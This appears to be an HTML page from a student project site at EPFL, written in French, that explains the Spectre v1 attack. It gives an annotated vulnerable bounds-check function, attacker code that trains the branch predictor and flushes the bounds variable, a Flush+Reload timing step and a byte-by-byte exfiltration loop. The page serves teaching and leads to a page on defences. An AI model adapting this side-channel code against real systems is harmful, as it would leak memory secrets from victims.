@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>L'attaque Spectre — EPFL</title>
+  <link rel="stylesheet" href="style.css?v=10">
+  <script defer src="theme.js?v=10"></script>
+</head>
+<body>
+
+<nav>
+  <div class="nav-inner">
+    <a href="index.html" class="nav-brand"><span>Spectre</span> &amp; Cache</a>
+    <button id="nav-toggle" class="nav-toggle" aria-label="Menu">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+        <line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/>
+      </svg>
+    </button>
+    <ul class="nav-links" id="nav-links">
+      <li><a href="index.html">Home</a></li>
+      <li><a href="context.html">Context</a></li>
+      <li><a href="flush-reload.html">Flush+Reload</a></li>
+      <li><a href="spectre.html" class="active">Spectre</a></li>
+      <li><a href="barriers.html">Barriers</a></li>
+      <li><a href="results.html">Results</a></li>
+      <li><a href="report.html">Report</a></li>
+    </ul>
+  </div>
+</nav>
+
+<div class="page-hero">
+  <div class="container">
+    <div class="section-tag">Vulnérabilité CVE-2017-5753</div>
+    <h1>L'attaque <span style="color:var(--accent);">Spectre</span> v1</h1>
+    <p>Mécanisme complet, code vulnérable annoté, scénario d'attaque pas à pas.</p>
+  </div>
+</div>
+
+<!-- OVERVIEW -->
+<section>
+  <div class="container">
+    <div class="section-header">
+      <div class="section-tag">Vue d'ensemble</div>
+      <h2>Spectre en trois phases</h2>
+      <p>Spectre v1 combine prédiction de branchement, exécution spéculative hors limites, et Flush+Reload pour exfiltrer des données normalement inaccessibles.</p>
+    </div>
+
+    <div class="cards-grid" style="margin-bottom:40px;">
+      <div class="card">
+        <div class="card-icon blue" style="font-size:22px;">🎓</div>
+        <h3>Phase 1 — Entraînement</h3>
+        <p>Appeler la fonction vulnérable avec des entrées <em>valides</em> (x &lt; array1_size) pour que le Branch Predictor Unit (BPU) apprenne à prédire "branche prise".</p>
+      </div>
+      <div class="card">
+        <div class="card-icon red" style="font-size:22px;">👻</div>
+        <h3>Phase 2 — Exploitation</h3>
+        <p>Appeler avec x hors-limites (pointant vers un secret). Le BPU prédit encore "pris" → spéculation → accès hors-limites → secret chargé en cache.</p>
+      </div>
+      <div class="card">
+        <div class="card-icon green" style="font-size:22px;">📡</div>
+        <h3>Phase 3 — Exfiltration</h3>
+        <p>Utiliser Flush+Reload pour mesurer quel index du tableau de sonde est en cache. L'index chaud = la valeur du secret.</p>
+      </div>
+    </div>
+
+    <!-- FULL CODE -->
+    <div class="section-divider">Code vulnérable complet (Spectre v1)</div>
+    <div class="code-block">
+<span class="line"><span class="comment">/* ══ VARIABLES VICTIMES ══════════════════════════════════════════════════ */</span></span>
+<span class="line"><span class="type">unsigned int</span>  array1_size = <span class="num">16</span>;</span>
+<span class="line"><span class="type">uint8_t</span>       array1[<span class="num">160</span>];                   <span class="comment">// tableau d'accès légitimes</span></span>
+<span class="line"><span class="type">uint8_t</span>       array2[<span class="num">256</span> * <span class="num">512</span>];             <span class="comment">// tableau de sonde (probe array)</span></span>
+<span class="line"><span class="type">char</span>          secret[] = <span class="str">"Mon secret EPFL"</span>;  <span class="comment">// valeur à exfiltrer</span></span>
+<span class="line"></span>
+<span class="line"><span class="comment">/* ══ FONCTION VICTIME ════════════════════════════════════════════════════ */</span></span>
+<span class="line"><span class="type">void</span> <span class="fn">victim_function</span>(<span class="type">size_t</span> x) {</span>
+<span class="line">    <span class="keyword">if</span> (x &lt; array1_size) {                  <span class="comment">// ① garde de sécurité</span></span>
+<span class="line">        <span class="type">uint8_t</span> val = array1[x];              <span class="comment">// ② accès tableau</span></span>
+<span class="line">        <span class="type">volatile</span> y = array2[val * <span class="num">512</span>];       <span class="comment">// ③ encodage canal auxiliaire</span></span>
+<span class="line">    }                                         <span class="comment">// ← Si spéculatif : val = secret !</span></span>
+<span class="line">}</span>
+<span class="line"></span>
+<span class="line"><span class="comment">/* ══ CODE ATTAQUANT ══════════════════════════════════════════════════════ */</span></span>
+<span class="line"><span class="comment">// PHASE 1 : Entraîner le prédicteur avec des x valides</span></span>
+<span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="num">0</span>; i &lt; <span class="num">200</span>; i++)</span>
+<span class="line">    <span class="fn">victim_function</span>(i % array1_size);</span>
+<span class="line"></span>
+<span class="line"><span class="comment">// PHASE 2 : Exécution malveillante</span></span>
+<span class="line">x_malveillant = (<span class="type">size_t</span>)(secret - (<span class="type">char</span>*)array1); <span class="comment">// offset vers le secret</span></span>
+<span class="line"><span class="fn">_mm_clflush</span>(&amp;array1_size);                        <span class="comment">// rendre la garde lente</span></span>
+<span class="line"><span class="fn">victim_function</span>(x_malveillant);                    <span class="comment">// → spéculation !</span></span>
+<span class="line"></span>
+<span class="line"><span class="comment">// PHASE 3 : Flush+Reload pour lire le cache</span></span>
+<span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="num">0</span>; i &lt; <span class="num">256</span>; i++) {</span>
+<span class="line">    t = <span class="fn">rdtscp_latency</span>(&amp;array2[i * <span class="num">512</span>]);</span>
+<span class="line">    <span class="keyword">if</span> (t &lt; THRESHOLD) leaked_value = i;           <span class="comment">// hit → secret !</span></span>
+<span class="line">}</span>
+    </div>
+  </div>
+</section>
+
+<!-- DETAILED STEPS -->
+<section class="alt">
+  <div class="container">
+    <div class="section-header">
+      <div class="section-tag">Analyse détaillée</div>
+      <h2>Pourquoi la garde de sécurité est inutile</h2>
+    </div>
+
+    <div class="prose">
+      <p>
+        La ligne <code style="font-family:var(--font-mono);font-size:12px;color:var(--blue);">if (x &lt; array1_size)</code> est censée protéger contre les accès hors-limites. Mais le processeur <em>ne connaît pas encore</em> la valeur de <code style="font-family:var(--font-mono);font-size:12px;color:var(--blue);">array1_size</code> quand il commence à spéculer.
+      </p>
+      <p>
+        L'astuce clé de l'attaquant : <strong>vider <code style="font-family:var(--font-mono);font-size:12px;">array1_size</code> du cache</strong> avec <code style="font-family:var(--font-mono);font-size:12px;color:var(--blue);">clflush(&amp;array1_size)</code>. Maintenant le chargement de <code style="font-family:var(--font-mono);font-size:12px;">array1_size</code> prend ~200 cycles. Pendant ces 200 cycles, le processeur spécule sur la base de sa prédiction — et exécute le corps du if avec x hors-limites.
+      </p>
+      <p>
+        Quand le résultat de <code style="font-family:var(--font-mono);font-size:12px;">array1_size</code> arrive enfin et que la condition est évaluée comme fausse, l'exécution spéculative est annulée. Mais <code style="font-family:var(--font-mono);font-size:12px;color:var(--accent);">array2[secret_value * 512] est déjà en cache.</code>
+      </p>
+    </div>
+
+    <div class="alert warning" style="margin-top:24px;">
+      <div class="alert-title">⚠ Timing Attack sur array1_size</div>
+      En flushant array1_size, l'attaquant crée une fenêtre de spéculation artificielle. Plus la latence de chargement est grande, plus la fenêtre est large, et plus l'exécution spéculative avance loin dans le code hors-limites.
+    </div>
+  </div>
+</section>
+
+<!-- SCENARIO -->
+<section>
+  <div class="container">
+    <div class="section-header">
+      <div class="section-tag">Scénario concret</div>
+      <h2>Exfiltration octet par octet</h2>
+    </div>
+
+    <div class="prose">
+      <p>
+        En répétant l'attaque pour chaque octet du secret (en faisant varier x_malveillant), l'attaquant peut exfiltrer un secret de longueur arbitraire. Dans la pratique, on répète chaque byte ~1000 fois et on prend la valeur avec le plus grand nombre de hits.
+      </p>
+    </div>
+
+    <div class="code-block" style="margin-top:20px;">
+<span class="line"><span class="comment">/* Exfiltration de 'n' octets à partir de 'target_addr' */</span></span>
+<span class="line"><span class="keyword">for</span> (<span class="type">int</span> byte_idx = <span class="num">0</span>; byte_idx &lt; n; byte_idx++) {</span>
+<span class="line">    <span class="type">int</span> results[<span class="num">256</span>] = {<span class="num">0</span>};</span>
+<span class="line"></span>
+<span class="line">    <span class="keyword">for</span> (<span class="type">int</span> trial = <span class="num">0</span>; trial &lt; <span class="num">1000</span>; trial++) {</span>
+<span class="line">        <span class="fn">flush_probe_array</span>();                         <span class="comment">// Flush</span></span>
+<span class="line">        <span class="fn">train_branch_predictor</span>(array1_size);         <span class="comment">// Train</span></span>
+<span class="line">        <span class="fn">_mm_clflush</span>(&amp;array1_size);                   <span class="comment">// Slow down guard</span></span>
+<span class="line">        <span class="fn">victim_function</span>(target_addr + byte_idx);    <span class="comment">// Exploit</span></span>
+<span class="line">        <span class="fn">reload_and_count</span>(results);                  <span class="comment">// Reload</span></span>
+<span class="line">    }</span>
+<span class="line"></span>
+<span class="line">    <span class="type">int</span> best = <span class="fn">argmax</span>(results);</span>
+<span class="line">    <span class="fn">printf</span>(<span class="str">"byte[%d] = 0x%02x ('%c')\n"</span>, byte_idx, best, best);</span>
+<span class="line">}</span>
+    </div>
+
+    <div class="stat-grid" style="margin-top:32px;">
+      <div class="stat-card">
+        <strong style="color:var(--blue);">~1000</strong>
+        <span>itérations par octet</span>
+      </div>
+      <div class="stat-card">
+        <strong style="color:var(--green);">~99%</strong>
+        <span>taux de succès typique</span>
+      </div>
+      <div class="stat-card">
+        <strong style="color:var(--orange);">~ms</strong>
+        <span>par octet extrait</span>
+      </div>
+      <div class="stat-card">
+        <strong style="color:var(--accent);">illimité</strong>
+        <span>longueur exfiltrable</span>
+      </div>
+    </div>
+
+    <div style="margin-top:40px;display:flex;gap:12px;flex-wrap:wrap;">
+      <a href="barriers.html" class="btn btn-primary">Suivant : Barrières & Protections →</a>
+      <a href="flush-reload.html" class="btn btn-ghost">← Flush+Reload</a>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <strong>Projet Bachelor · EPFL · Printemps 2026</strong> &nbsp;·&nbsp;
+  Zyad Tajeddine (362730) &nbsp;·&nbsp; Encadrant : Thomas Bourgeat
+</footer>
+
+<script>
+document.getElementById('nav-toggle').addEventListener('click', () => {
+  document.getElementById('nav-links').classList.toggle('open');
+});
+</script>
+
+</body>
+</html>
